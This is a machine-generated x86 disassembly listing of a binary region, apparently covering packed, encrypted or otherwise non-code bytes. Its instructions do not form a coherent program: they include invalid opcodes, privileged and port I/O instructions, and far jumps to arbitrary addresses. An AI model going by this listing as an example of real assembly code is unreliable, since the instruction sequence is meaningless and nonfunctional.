  420f82:	test   edi,0xd2b63381
  420f88:	pop    es
  420f89:	dec    edi
  420f8a:	mov    ds:0xe3e70761,al
  420f8f:	push   esi
  420f90:	sub    eax,0x278ba6c6
  420f95:	sub    eax,0xd6f81796
  420f9a:	call   0x40a5:0x1b9c4ab6
  420fa1:	pop    edi
  420fa2:	dec    edx
  420fa3:	iret   
  420fa4:	jmp    0xc8f7:0x2289e8d9
  420fab:	std    
  420fac:	dec    esi
  420fad:	fucomi st,st(4)
  420faf:	sub    BYTE PTR [edi+0x30aaf7b8],0xc9
  420fb6:	mov    bl,0x72
  420fb8:	adc    eax,0xe76e1380
  420fbd:	es cdq 
  420fbf:	pop    esp
  420fc0:	imul   edx,DWORD PTR [edx],0xd078303f
  420fc6:	sub    al,0x48
  420fc8:	jb     0x421045
  420fca:	pop    esi
  420fcb:	mov    cl,0x6e
  420fcd:	aas    
  420fce:	into   
  420fcf:	and    bh,al
  420fd1:	nop
  420fd2:	push   ss
  420fd3:	push   esi
  420fd4:	or     eax,0x363ec6f9
  420fd9:	add    ah,BYTE PTR [ecx+edi*4-0x26]
  420fdd:	ds sub bh,bh
  420fe0:	xchg   edi,eax
  420fe1:	out    0x19,eax
  420fe3:	or     BYTE PTR [edi+0x58],0x91
  420fe7:	dec    esi
  420fe8:	push   edi
  420fe9:	fdiv   DWORD PTR [ebx+0x76611441]
  420fef:	inc    ebp
  420ff0:	adc    DWORD PTR ds:0xfa1dbd54,edx
  420ff6:	outs   dx,BYTE PTR ds:[si]
  420ff8:	sbb    dl,BYTE PTR [esi]
  420ffa:	into   
  420ffb:	xchg   ebx,eax
  420ffc:	or     ecx,DWORD PTR [eax+0x19]
  420fff:	imul   ecx,ebx,0x90e97d26
  421005:	push   ebx
  421006:	test   DWORD PTR [esi],ebp
  421008:	mov    esi,0x6dd3d910
  42100d:	fidiv  WORD PTR [ecx]
  42100f:	sar    BYTE PTR [esi+0x1d75d14c],0x14
  421016:	in     eax,0x4
  421018:	and    edi,DWORD PTR [ebx+edx*2-0x48]
  42101c:	mov    al,0x4c
  42101e:	int    0x92
  421020:	jmp    0x421074
  421022:	and    eax,esp
  421024:	or     esp,edx
  421026:	adc    bl,BYTE PTR [ebx-0xae0049e]
  42102c:	sub    BYTE PTR ds:0xc5038ef7,ah
  421032:	into   
  421033:	push   0xfd8c6205
  421038:	dec    esi
  421039:	xchg   edi,eax
  42103a:	gs es retf 
  42103d:	mov    ecx,0xfa610d33
  421042:	mov    ecx,0x9ed95a02
  421047:	push   edx
  421048:	repnz shr BYTE PTR es:[ebp-0x5fb294d8],0x9
  421051:	repnz test eax,0xeec3ef4e
  421057:	adc    ch,ah
  421059:	jo     0x4210d6
  42105b:	ficom  WORD PTR [ecx-0x78]
  42105e:	dec    edi
  42105f:	clc    
  421060:	mov    edx,DWORD PTR [esi-0xb02c285]
  421066:	push   cs
  421067:	xchg   DWORD PTR [ebx],edx
  421069:	push   eax
  42106a:	pop    ds
  42106b:	xchg   DWORD PTR [ecx],ebx
  42106d:	push   ds
  42106e:	ficomp DWORD PTR [ebp+0x228003b3]
  421074:	jmp    0x421061
  421076:	push   0xffffffdc
  421078:	das    
  421079:	pop    eax
  42107a:	arpl   WORD PTR [eax],bx
  42107c:	push   edi
  42107d:	inc    ebx
  42107e:	pop    edx
  42107f:	daa    
  421080:	out    0x50,eax
  421082:	dec    edx
  421083:	jmp    0xf98:0xc2dfacb6
  42108a:	js     0x421042
  42108c:	popa   
  42108d:	in     al,0xc2
  42108f:	push   edx
  421090:	enter  0x5c3e,0x35
  421094:	dec    ecx
  421095:	scas   al,BYTE PTR es:[edi]
  421096:	in     eax,dx
  421097:	rol    DWORD PTR [eax-0x65],cl
  42109a:	mov    edx,0x599d0128
  42109f:	ins    DWORD PTR es:[edi],dx
  4210a0:	mov    ds:0xaf3fb1a,eax
  4210a5:	mov    al,dl
  4210a7:	add    eax,0x3dbcda2d
  4210ac:	inc    edi
  4210ad:	arpl   WORD PTR [edx-0x8],dx
  4210b0:	dec    ebp
  4210b1:	mov    bh,0x81
  4210b3:	jne    0x42106a
  4210b5:	pop    ss
  4210b6:	xor    al,0x99
  4210b8:	fnstcw WORD PTR [ebx-0x3bf81185]
  4210be:	adc    bh,BYTE PTR [eax-0x6d68543a]
  4210c4:	jo     0x42111a
  4210c6:	adc    ax,0x8c44
  4210ca:	aad    0x93
  4210cc:	(bad)  
  4210cd:	in     eax,dx
  4210ce:	cmp    eax,0xaad5d8aa
  4210d3:	inc    esp
  4210d4:	test   eax,0x38fd6352
  4210d9:	imul   edx,DWORD PTR [edx-0x65],0xd
  4210dd:	mov    ebp,0xa2ea24c4
  4210e2:	mov    bl,0xd1
  4210e4:	add    BYTE PTR ds:0x7bc27e6f,0x1f
  4210eb:	xor    BYTE PTR ds:0xe3d7f8ce,bh
  4210f1:	aam    0x59
  4210f3:	mov    ds:0x2e75cbcb,eax
  4210f8:	sbb    eax,0x85e99dde
  4210fd:	xor    eax,0x63d511e
  421102:	(bad)  
  421103:	cmp    bl,BYTE PTR [esi+0x3b38c22]
  421109:	push   edi
  42110a:	and    bl,BYTE PTR [edi]
  42110c:	xchg   edx,eax
  42110d:	fild   QWORD PTR [eax+0x52f389a2]
  421113:	call   0x7ea56216
  421118:	ror    DWORD PTR [eax+0x36306931],1
  42111e:	in     al,dx
  42111f:	not    DWORD PTR [edx]
  421121:	or     al,0x21
  421123:	pop    ebx
  421124:	bound  eax,QWORD PTR [eax+0x498698a]
  42112a:	test   ebx,ebp
  42112c:	mov    ebp,ss
  42112e:	push   ecx
  42112f:	lahf   
  421130:	mov    bl,ah
  421132:	cmp    BYTE PTR [edi+0x6e469b5c],ah
  421138:	inc    ecx
  421139:	inc    edx
  42113a:	sbb    ebx,0xffffffac
  42113d:	stos   DWORD PTR es:[edi],eax
  42113e:	sbb    eax,0x4b3ff288
  421143:	into   
  421144:	jb     0x421176
  421146:	popa   
  421147:	test   WORD PTR [esi-0x43eef8ba],ax
  42114e:	mov    eax,0xcc6e85ef
  421153:	jne    0x42110d
  421155:	push   es
  421156:	jecxz  0x42114a
  421158:	std    
  421159:	sub    BYTE PTR [ecx],ch
  42115b:	and    al,0x57
  42115d:	jp     0x421136
  42115f:	sub    eax,0xfb2bceb4
  421164:	leave  
  421165:	addr16 or ecx,esp
  421168:	fdivr  QWORD PTR [ebx+0x22]
  42116b:	lock mov ds:0x814868a6,eax
  421171:	add    bl,BYTE PTR [eax+eiz*1+0x3c]
  421175:	(bad)  
  421176:	dec    ebp
  421177:	inc    ebp
  421178:	mov    BYTE PTR [eax+0x60aa1194],ah
  42117e:	std    
  42117f:	add    al,0x6
  421181:	imul   ebp,DWORD PTR [ebp-0x5dd98aa5],0x5c
  421188:	dec    ecx
  421189:	mov    esi,0xa80484a2
  42118e:	call   0x50dfb7ea
  421193:	leave  
  421194:	xchg   ebp,eax
  421195:	cdq    
  421196:	sbb    eax,0xee7e4a3d
  42119b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42119c:	push   0x3c
  42119e:	shl    DWORD PTR [eax],1
  4211a0:	dec    esi
  4211a1:	fdivr  DWORD PTR [esi+esi*4+0x2c]
  4211a5:	outs   dx,BYTE PTR ds:[esi]
  4211a6:	stos   DWORD PTR es:[edi],eax
  4211a7:	or     BYTE PTR [edx],ah
  4211a9:	xchg   BYTE PTR [esi],cl
  4211ab:	dec    ecx
  4211ac:	js     0x421167
  4211ae:	xchg   edi,eax
  4211af:	pusha  
  4211b0:	push   esp
  4211b1:	and    BYTE PTR [eax],0x58
  4211b4:	add    al,0xdc
  4211b6:	mov    cl,0x18
  4211b8:	lea    ebx,[esi-0x17498163]
  4211be:	push   es
  4211bf:	dec    ebp
  4211c0:	stos   BYTE PTR es:[edi],al
  4211c1:	mov    eax,ds:0x2f6a3a4a
  4211c6:	adc    BYTE PTR [eax],cl
  4211c8:	adc    edx,DWORD PTR [edx-0x3e]
  4211cb:	add    DWORD PTR [ecx+0x14],ecx
  4211ce:	call   0x1af62a81
  4211d3:	jecxz  0x421176
  4211d5:	shl    BYTE PTR [edx+0x5b],cl
  4211d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211d9:	adc    eax,DWORD PTR [ebx]
  4211db:	outs   dx,DWORD PTR ds:[esi]
  4211dc:	add    al,0x97
  4211de:	dec    esi
  4211df:	sub    BYTE PTR [ecx+0x18757189],bh
  4211e5:	dec    edi
  4211e6:	lea    ebp,[edi+0x585b7e3b]
  4211ec:	jmp    0xb183:0x204b4d29
  4211f3:	loop   0x4211f2
  4211f5:	adc    eax,0x2b22779b
  4211fa:	adc    al,0xb3
  4211fc:	add    BYTE PTR [eax-0x67377100],bl
  421202:	loop   0x4211f3
  421204:	xchg   esp,eax
  421205:	sub    BYTE PTR [esi+0x19],dh
  421208:	in     eax,0x2d
  42120a:	cmp    eax,DWORD PTR [ebp-0x2fa98ea4]
  421210:	adc    dl,dl
  421212:	out    0x2e,al
  421214:	xchg   ebp,eax
  421215:	rol    DWORD PTR [edx+ebp*2-0x2daf0582],cl
  42121c:	mov    DWORD PTR [eax+0x4bca0529],ebx
  421222:	pop    es
  421223:	(bad)  
  421225:	adc    dl,BYTE PTR [eax]
  421227:	sahf   
  421228:	adc    DWORD PTR ds:0x5b9f1c50,esp
  42122e:	pop    ss
  42122f:	push   edi
  421230:	xor    eax,DWORD PTR [edx+0x3c]
  421233:	xor    eax,0x961667c9
  421238:	mov    eax,ds:0xc28c4eae
  42123d:	xchg   BYTE PTR [ebx+0x22],ah
  421240:	test   al,0x93
  421242:	jnp    0x42127d
  421244:	xchg   edx,eax
  421245:	inc    edx
  421246:	push   0xfffffff4
  421248:	sub    DWORD PTR [esi+0x6a],edx
  42124b:	dec    esi
  42124c:	inc    edi
  42124d:	push   0x63
  42124f:	fs out dx,al
  421251:	xor    bh,dh
  421253:	push   esp
  421254:	jne    0x4212ba
  421256:	dec    eax
  421257:	je     0x42123b
  421259:	jno    0x421261
  42125b:	aam    0x72
  42125d:	push   ebx
  42125e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42125f:	dec    eax
  421260:	int3   
  421261:	test   BYTE PTR [edi],bl
  421263:	sbb    ebx,DWORD PTR [eax+0x55]
  421266:	mov    edx,0x43a36d
  42126b:	inc    esp
  42126c:	clc    
  42126d:	ds hlt 
  42126f:	iret   
  421270:	fs jle 0x421265
  421273:	cmp    ecx,ebx
  421275:	pop    ebx
  421276:	add    eax,0xbcfcb9cb
  42127b:	pop    edx
  42127c:	mov    eax,0x98d2af18
  421281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421282:	call   0x9df7432e
  421287:	xchg   ebp,eax
  421288:	pop    ebx
  421289:	mov    al,0xee
  42128b:	aam    0x7e
  42128d:	lods   eax,DWORD PTR ds:[esi]
  42128e:	cmc    
  42128f:	inc    esp
  421290:	fcmove st,st(7)
  421292:	rcr    BYTE PTR [ebp+0x5b207129],1
  421298:	inc    esp
  421299:	dec    ebx
  42129a:	mov    ecx,0x2b068357
  42129f:	jecxz  0x42130a
  4212a1:	inc    ecx
  4212a2:	imul   ebp,ebp,0x3958536e
  4212a8:	pop    esi
  4212a9:	bndstx [ebp+0x34],bnd1
  4212ad:	(bad)  
  4212ae:	not    DWORD PTR [edi-0x32]
  4212b1:	ins    BYTE PTR es:[edi],dx
  4212b2:	ret    
  4212b3:	in     al,dx
  4212b4:	inc    BYTE PTR [eax]
  4212b6:	ins    BYTE PTR es:[edi],dx
  4212b7:	mov    cl,0x6c
  4212b9:	loope  0x42126d
  4212bb:	lods   eax,DWORD PTR ds:[esi]
  4212bc:	leave  
  4212bd:	mov    ds:0xe248abac,al
  4212c2:	jg     0x42129e
  4212c4:	sub    BYTE PTR [ebp-0x45],cl
  4212c7:	cmp    eax,0xb4e298
  4212cc:	mov    cl,0x2a
  4212ce:	icebp  
  4212cf:	mov    dh,0x7d
  4212d1:	cmp    cl,BYTE PTR [ecx+0x72]
  4212d4:	loop   0x421328
  4212d6:	imul   ebp,DWORD PTR [edx],0x69
  4212d9:	cli    
  4212da:	mov    al,0x94
  4212dc:	xchg   DWORD PTR [ebp-0x4e],eax
  4212df:	sbb    eax,0x365f5336
  4212e4:	(bad)  
  4212e5:	out    dx,al
  4212e6:	jmp    0x9c76:0x70232496
  4212ed:	jne    0x421279
  4212ef:	and    esp,DWORD PTR ds:0x47c18b3a
  4212f5:	xchg   ebx,eax
  4212f6:	std    
  4212f7:	std    
  4212f8:	mov    esi,0x8addc23c
  4212fd:	jno    0x421309
  4212ff:	int3   
  421300:	sub    ah,BYTE PTR [ebx+0x61]
  421303:	shl    DWORD PTR [eax+0x3c],cl
  421306:	sahf   
  421307:	inc    ecx
  421308:	push   ebx
  421309:	addr16 dec edx
  42130b:	jmp    0x9a1be9ca
  421310:	test   BYTE PTR [ecx-0x10],bl
  421313:	mov    al,0x82
  421315:	dec    ebx
  421316:	add    ax,bp
  421319:	xchg   di,ax
  42131b:	test   al,0xa0
  42131d:	data16 mov ch,0xaf
  421320:	out    dx,al
  421321:	mov    gs,WORD PTR [esi-0xa86741b]
  421327:	call   0x1c50bd56
  42132c:	mov    cl,0x78
  42132e:	mov    bh,0xb8
  421330:	imul   ecx,DWORD PTR [esi],0xfffffff7
  421333:	loopne 0x42131a
  421335:	mov    bx,0x3b60
  421339:	pop    esp
  42133a:	aam    0xa6
  42133c:	mov    ebx,0x6e533166
  421341:	pop    edi
  421342:	add    eax,0x4934a679
  421347:	dec    esi
  421348:	pop    esp
  421349:	in     al,0x1d
  42134b:	jnp    0x4213aa
  42134d:	and    BYTE PTR [ebp-0x33],0xc9
  421351:	sub    BYTE PTR [esi+0x547ce8eb],dl
  421357:	dec    esi
  421358:	xor    ebx,DWORD PTR [ebp+0x266faae8]
  42135e:	and    al,0x1a
  421360:	imul   esi,DWORD PTR [edx],0x4054f729
  421366:	jp     0x4213e4
  421368:	in     al,dx
  421369:	jecxz  0x421399
  42136b:	or     esi,DWORD PTR [edi]
  42136d:	mov    al,ds:0x5808fd01
  421372:	test   al,0xe3
  421374:	xor    edx,0xffffffd6
  421377:	leave  
  421378:	test   eax,0xc63718d8
  42137d:	or     al,0x1b
  42137f:	ds out 0x3b,al
  421382:	or     eax,0x1ab9b4b9
  421387:	push   edx
  421388:	jo     0x4213a2
  42138a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42138b:	fld    TBYTE PTR [ebp+0x5c]
  42138e:	pop    ss
  42138f:	fadd   DWORD PTR [edx]
  421391:	stos   DWORD PTR es:[edi],eax
  421392:	into   
  421393:	push   ecx
  421394:	inc    eax
  421395:	into   
  421396:	mov    ch,0xb9
  421398:	add    al,0xbf
  42139a:	hlt    
  42139b:	and    ah,BYTE PTR [ebx]
  42139d:	jge    0x421408
  42139f:	mov    cl,0xee
  4213a1:	add    edx,esi
  4213a3:	fwait
  4213a4:	mov    ds:0xd8608eaa,al
  4213a9:	enter  0xb944,0x93
  4213ad:	push   esp
  4213ae:	lods   al,BYTE PTR ds:[esi]
  4213af:	fld    TBYTE PTR [ebx]
  4213b1:	into   
  4213b2:	sbb    bh,BYTE PTR [esi+0xd]
  4213b5:	cmp    BYTE PTR [edx+0x7035dd06],0x5
  4213bc:	mov    es,WORD PTR [edx+0x45]
  4213bf:	shr    BYTE PTR [edx-0x73b012aa],0xd1
  4213c6:	call   0xb12c:0x2bdd9771
  4213cd:	(bad)  
  4213ce:	xlat   BYTE PTR ds:[ebx]
  4213cf:	repnz xlat BYTE PTR ds:[ebx]
  4213d1:	adc    ebx,DWORD PTR [esp+edx*8]
  4213d4:	add    ebx,eax
  4213d6:	lock jle 0x42143b
  4213d9:	sub    BYTE PTR [ebp-0x1d604b77],dl
  4213df:	mov    ebx,0xbc28e62f
  4213e4:	imul   ebp,DWORD PTR [ebp+0x1f],0xb8e20838
  4213eb:	lahf   
  4213ec:	fisttp QWORD PTR [ebx]
  4213ee:	clc    
  4213ef:	bswap  edi
  4213f1:	ror    ebx,cl
  4213f3:	in     eax,dx
  4213f4:	rcl    BYTE PTR [ecx-0x10],1
  4213f7:	pop    ebx
  4213f8:	xchg   ebx,eax
  4213f9:	mov    BYTE PTR [edx+0x33],cl
  4213fc:	stos   DWORD PTR es:[edi],eax
  4213fd:	sbb    eax,0xc4d7f83
  421402:	mov    al,ds:0xb54fb1fe
  421407:	xor    eax,0x15efc1a4
  42140c:	jb     0x4213f8
  42140e:	(bad)  
  42140f:	push   ebx
  421410:	ds in  al,dx
  421412:	push   cs
  421413:	xchg   ecx,eax
  421414:	mov    al,0x2
  421416:	out    dx,al
  421417:	xchg   ecx,eax
  421418:	mov    eax,ds:0xed58a7e
  42141d:	adc    dh,BYTE PTR [eax]
  42141f:	push   eax
  421420:	mov    BYTE PTR [esi-0x18],al
  421423:	dec    edx
  421424:	or     eax,0x5d9c4717
  421429:	les    edi,FWORD PTR [ecx+0x62a31dfd]
  42142f:	(bad)
  421432:	in     eax,dx
  421433:	(bad)  
  421434:	inc    esi
  421435:	out    0x4d,eax
  421437:	mov    ds:0x4b0cad7e,al
  42143c:	out    dx,eax
  42143d:	enter  0xf3c0,0x98
  421441:	aam    0x6b
  421443:	inc    eax
  421444:	cld    
  421445:	cli    
  421446:	scas   al,BYTE PTR es:[edi]
  421447:	mov    cl,0xf8
  421449:	mov    ds:0x351e99fc,al
  42144e:	ins    DWORD PTR es:[edi],dx
  42144f:	cmc    
  421450:	ja     0x4214b0
  421452:	fidivr DWORD PTR [ebp-0x480bf46d]
  421458:	pusha  
  421459:	sbb    al,0x7a
  42145b:	adc    esi,edi
  42145d:	shl    DWORD PTR [edx-0x79],1
  421460:	jmp    0x421408
  421462:	xor    BYTE PTR [ebx],cl
  421464:	and    dl,bh
  421466:	xchg   edx,eax
  421467:	test   BYTE PTR [esi],ch
  421469:	push   ds
  42146a:	pop    eax
  42146b:	rcr    BYTE PTR [esi],0x80
  42146e:	xchg   DWORD PTR [ebp-0x22451c5f],esp
  421474:	pop    esi
  421475:	je     0x4214e0
  421477:	pop    ecx
  421478:	jle    0x4214ca
  42147a:	add    al,BYTE PTR [esi]
  42147c:	push   es
  42147d:	clc    
  42147e:	sahf   
  42147f:	sbb    esp,edx
  421481:	push   esp
  421482:	sbb    al,0x8d
  421484:	aam    0x49
  421486:	push   ebp
  421487:	test   DWORD PTR [edi],edi
  421489:	shl    BYTE PTR [ebx-0x739eaace],0x9e
  421490:	jecxz  0x421428
  421492:	xor    DWORD PTR [ebx],ebp
  421494:	loopne 0x42148f
  421496:	push   ebx
  421497:	or     BYTE PTR [ebx],al
  421499:	iret   
  42149a:	je     0x421438
  42149c:	inc    esi
  42149d:	test   al,0x2c
  42149f:	in     eax,dx
  4214a0:	adc    dl,bh
  4214a2:	aas    
  4214a3:	pop    ax
  4214a5:	retf   0x4ae9
  4214a8:	popa   
  4214a9:	fucom  st(5)
  4214ab:	adc    DWORD PTR [esi+0x63],0xb8865e8d
  4214b2:	out    0x9a,eax
  4214b4:	mov    BYTE PTR [edx-0x47c2b949],0xcf
  4214bb:	out    dx,al
  4214bc:	push   0xffffff97
  4214be:	retf   
  4214bf:	(bad)  [edx-0x202ce531]
  4214c5:	dec    edi
  4214c6:	aad    0xb9
  4214c8:	mov    ch,0x2f
  4214ca:	xchg   edx,eax
  4214cb:	sub    dl,BYTE PTR [edx+0x494e3c86]
  4214d1:	iret   
  4214d2:	enter  0xd45d,0xc8
  4214d6:	icebp  
  4214d7:	jo     0x421495
  4214d9:	xchg   ebx,eax
  4214da:	inc    edx
  4214db:	or     esp,DWORD PTR [edi+0x30f959b7]
  4214e1:	push   ds
  4214e2:	push   0x5fc373b5
  4214e7:	ins    DWORD PTR es:[edi],dx
  4214e8:	xor    DWORD PTR [edi+0x6d4fa81e],0x2265a000
  4214f2:	ds stos DWORD PTR es:[edi],eax
  4214f4:	not    BYTE PTR [edi]
  4214f6:	push   ds
  4214f7:	shl    DWORD PTR [esi+0x13],cl
  4214fa:	or     al,0x5b
  4214fc:	sub    ebp,DWORD PTR [edx+0x1a]
  4214ff:	inc    esp
  421500:	dec    ebp
  421501:	mov    esi,0x998e2826
  421506:	or     al,0x5e
  421508:	(bad)  
  421509:	retf   
  42150a:	mov    ebx,0x6cae923b
  42150f:	sub    dh,BYTE PTR [edx+0x6c205847]
  421515:	fst    QWORD PTR [ecx]
  421517:	push   edx
  421518:	and    eax,0x65a59322
  42151d:	lea    ecx,[ecx-0x9]
  421520:	int    0xe7
  421522:	mov    dh,0x4
  421524:	adc    eax,0x132a588e
  421529:	sub    eax,0xe77f47a
  42152e:	pop    eax
  42152f:	mov    eax,0x44b80177
  421534:	retf   0x9ddf
  421537:	cmp    esp,esp
  421539:	lods   eax,DWORD PTR ds:[esi]
  42153a:	test   eax,0xddd88ae9
  42153f:	xor    BYTE PTR [esp+eax*1],ch
  421542:	fwait
  421543:	jmp    0x4932:0x74887e2d
  42154a:	(bad)  
  42154b:	cs (bad) 
  42154d:	dec    edx
  42154e:	mov    ah,0xd6
  421550:	push   ds
  421551:	daa    
  421552:	pop    edx
  421553:	mov    al,ds:0x6eaf4954
  421558:	xchg   ebx,eax
  421559:	add    DWORD PTR [esi-0x14],ebx
  42155c:	fld    TBYTE PTR [ebp+0x29702802]
  421562:	stc    
  421563:	push   esi
  421564:	add    al,0xb2
  421566:	cld    
  421567:	and    ecx,DWORD PTR [ebx]
  421569:	xchg   esi,eax
  42156a:	push   ds
  42156b:	lods   al,BYTE PTR ds:[esi]
  42156c:	sub    ecx,DWORD PTR [ebx-0x61a933cf]
  421572:	js     0x4215e1
  421574:	inc    ecx
  421575:	inc    ebx
  421576:	xor    BYTE PTR [edx-0xedbe06a],0xda
  42157d:	lods   al,BYTE PTR ds:[esi]
  42157e:	mov    al,0xfd
  421580:	mov    WORD PTR [esi],fs
  421582:	jb     0x421526
  421584:	mov    dh,0x6d
  421586:	ss aas 
  421588:	shl    bl,0x25
  42158b:	jecxz  0x4215b6
  42158d:	pop    esi
  42158e:	pop    esp
  42158f:	jnp    0x4215e4
  421591:	sbb    eax,0xb24428f9
  421596:	(bad)  
  421597:	fsubr  DWORD PTR [eax]
  421599:	ins    DWORD PTR es:[edi],dx
  42159a:	mov    gs,eax
  42159c:	add    ecx,DWORD PTR [eax]
  42159e:	mov    ds:0x3a36d8c9,eax
  4215a3:	imul   edx,DWORD PTR [esi],0x4e
  4215a6:	inc    edi
  4215a7:	dec    eax
  4215a8:	mov    ebx,0xebeff6f0
  4215ad:	cmp    al,0x76
  4215af:	adc    dl,ah
  4215b1:	or     al,0x8d
  4215b3:	cmp    DWORD PTR [edi+0x75d03a68],ebx
  4215b9:	inc    ebx
  4215ba:	retf   0xc1ff
  4215bd:	mov    ebx,0xe83654dd
  4215c2:	xor    al,0xb2
  4215c4:	pop    esp
  4215c5:	pop    es
  4215c6:	xchg   ecx,eax
  4215c7:	push   0x575ce1f1
  4215cc:	in     al,dx
  4215cd:	jle    0x42155f
  4215cf:	push   ds
  4215d0:	mov    ds:0xbc891cc8,eax
  4215d5:	popfw  
  4215d7:	or     DWORD PTR [edi+0x4d],edi
  4215da:	fist   DWORD PTR [ebx]
  4215dc:	xchg   edx,eax
  4215dd:	test   DWORD PTR [ebx-0x4fee2e05],edx
  4215e3:	jno    0x4215d9
  4215e5:	not    BYTE PTR [ebx-0x4e18cdf2]
  4215eb:	push   cs
  4215ec:	les    edi,FWORD PTR [ecx+0x4aa07ef6]
  4215f2:	adc    ch,ch
  4215f4:	sub    dh,dl
  4215f6:	stos   DWORD PTR es:[edi],eax
  4215f7:	mov    esp,DWORD PTR ds:0x3c9f6ceb
  4215fd:	call   0xa659bdf7
  421602:	icebp  
  421603:	dec    esp
  421604:	xor    ebp,edx
  421606:	enter  0x4ebb,0xa4
  42160a:	mov    dl,0xfe
  42160c:	and    edx,DWORD PTR [edi+0x75d8bc73]
  421612:	dec    esp
  421613:	sub    al,0xe5
  421615:	mov    ds:0x6483d67d,al
  42161a:	outs   dx,DWORD PTR ds:[esi]
  42161b:	in     eax,0x1e
  42161d:	bound  edx,QWORD PTR [eax]
  42161f:	inc    ebp
  421620:	cmp    al,0x59
  421622:	and    BYTE PTR [ebx+eiz*2-0x3e],cl
  421626:	div    DWORD PTR [edx]
  421628:	or     DWORD PTR [ebx-0x6b08f6de],eax
  42162e:	lahf   
  42162f:	push   DWORD PTR [edx+edx*4]
  421632:	and    dh,dl
  421634:	and    bl,ch
  421636:	pop    ebx
  421637:	sbb    cl,BYTE PTR [esi-0x1c]
  42163a:	add    DWORD PTR [eax],edi
  42163c:	mov    dl,0x29
  42163e:	jae    0x421633
  421640:	mov    edi,ebp
  421642:	push   edx
  421643:	xor    eax,eax
  421645:	cmp    BYTE PTR [edx-0x6b],dl
  421648:	adc    bh,0x2d
  42164b:	js     0x421695
  42164d:	(bad)
  421651:	(bad)  
  421652:	lods   eax,DWORD PTR ds:[esi]
  421653:	jl     0x42169c
  421655:	pushf  
  421656:	push   esp
  421657:	push   esp
  421658:	das    
  421659:	mov    bl,0x66
  42165b:	mov    dl,0xd0
  42165d:	lods   eax,DWORD PTR ds:[esi]
  42165e:	jmp    DWORD PTR [eax-0x4dd646b5]
  421664:	xchg   esi,eax
  421665:	leave  
  421666:	repz in eax,dx
  421668:	jle    0x421609
  42166a:	sub    esp,edi
  42166c:	stos   BYTE PTR es:[edi],al
  42166d:	gs inc esp
  42166f:	and    ebp,DWORD PTR [ebp+0x68]
  421672:	jb     0x4216cd
  421674:	std    
  421675:	in     eax,dx
  421676:	push   0x42494d83
  42167b:	push   cs
  42167c:	push   ebx
  42167d:	push   cs
  42167e:	test   ah,bl
  421680:	je     0x42160f
  421682:	pushf  
  421683:	icebp  
  421684:	scas   al,BYTE PTR es:[edi]
  421685:	ror    DWORD PTR [edi-0x777cfbbb],cl
  42168b:	add    al,0x75
  42168d:	and    ebx,DWORD PTR [edi+edx*8+0x433b1575]
  421694:	add    ah,dl
  421696:	je     0x4216f7
  421698:	sti    
  421699:	loop   0x421681
  42169b:	xchg   ecx,eax
  42169c:	mov    ebx,0x2221138d
  4216a1:	dec    edi
  4216a2:	rcl    BYTE PTR [esi+0x7a4eda5d],1
  4216a8:	sub    eax,0x4982150d
  4216ad:	icebp  
  4216ae:	mov    dl,0xb
  4216b0:	jb     0x4216b6
  4216b2:	cmp    ecx,DWORD PTR [eax-0x1fe9fc98]
  4216b8:	shl    BYTE PTR [edx],0x9b
  4216bb:	inc    esp
  4216bc:	sub    eax,0x455cfa13
  4216c1:	push   eax
  4216c2:	adc    ch,BYTE PTR ds:0x31f4340c
  4216c8:	and    ebp,edx
  4216ca:	fsubr  QWORD PTR [edi]
  4216cc:	stos   DWORD PTR es:[edi],eax
  4216cd:	daa    
  4216ce:	xchg   ebp,eax
  4216cf:	push   0xc985149c
  4216d4:	(bad)  
  4216d5:	jmp    0xb12a350b
  4216da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216db:	mov    eax,0x8f6d8017
  4216e0:	mov    bl,0xc7
  4216e2:	cmp    BYTE PTR [ebx-0x44783a88],ch
  4216e8:	daa    
  4216e9:	jns    0x4216f0
  4216eb:	xchg   ecx,eax
  4216ec:	push   es
  4216ed:	loope  0x4216af
  4216ef:	ins    DWORD PTR es:[edi],dx
  4216f0:	aad    0xbd
  4216f2:	push   ecx
  4216f3:	adc    DWORD PTR [esi+0x67c33080],ebp
  4216f9:	push   0xffffffd9
  4216fb:	call   0x104c:0x2108dbc0
  421702:	dec    edi
  421703:	pushf  
  421704:	push   esp
  421705:	js     0x421728
  421707:	arpl   WORD PTR cs:[eax-0x3b],ax
  42170b:	pop    ds
  42170c:	and    al,BYTE PTR [ecx]
  42170e:	addr16 cmp eax,0xc9cce429
  421714:	adc    esi,ecx
  421716:	add    BYTE PTR [esi],bh
  421718:	add    ecx,0xf0372412
  42171e:	stos   BYTE PTR es:[edi],al
  42171f:	sti    
  421720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421721:	dec    edx
  421722:	(bad)  
  421723:	mov    cl,0x4b
  421725:	rol    bh,0xcc
  421728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421729:	pop    edi
  42172a:	lea    edi,[ebx-0x68]
  42172d:	aaa    
  42172e:	xchg   BYTE PTR [ebp+edi*8+0x6eb81d51],dh
  421735:	xchg   esp,eax
  421736:	sbb    al,0x8b
  421738:	lods   eax,DWORD PTR ds:[esi]
  421739:	pusha  
  42173a:	and    ch,bl
  42173c:	ficom  WORD PTR [esi]
  42173e:	add    esp,DWORD PTR [edi+ebp*8+0x5f]
  421742:	or     esp,edi
  421744:	sub    eax,0xbe500cfe
  421749:	dec    ebp
  42174a:	mov    esi,0x5d82adb7
  42174f:	repz je 0x4217ad
  421752:	push   ebp
  421753:	and    BYTE PTR [esi+0x42],0x66
  421757:	dec    esp
  421758:	lds    esi,FWORD PTR [edx]
  42175a:	mov    ds:0x6488921d,eax
  42175f:	pop    ebx
  421760:	int    0xb1
  421762:	daa    
  421763:	add    dh,ah
  421765:	push   edx
  421766:	loopne 0x4217b3
  421768:	adc    esp,edi
  42176a:	pop    edi
  42176b:	mov    cl,0x9e
  42176d:	mov    bh,BYTE PTR [edx-0x1fc96885]
  421773:	or     al,0xbe
  421775:	mov    edi,0x62b31d57
  42177a:	stos   DWORD PTR es:[edi],eax
  42177b:	xor    dh,BYTE PTR [ebx+0xd]
  42177e:	icebp  
  42177f:	adc    eax,0x2fbd84ce
  421784:	xor    al,0xf8
  421786:	aam    0x18
  421788:	or     eax,0x6146391
  42178d:	ror    ah,1
  42178f:	push   es
  421790:	or     dl,BYTE PTR ds:0x1f2f33c8
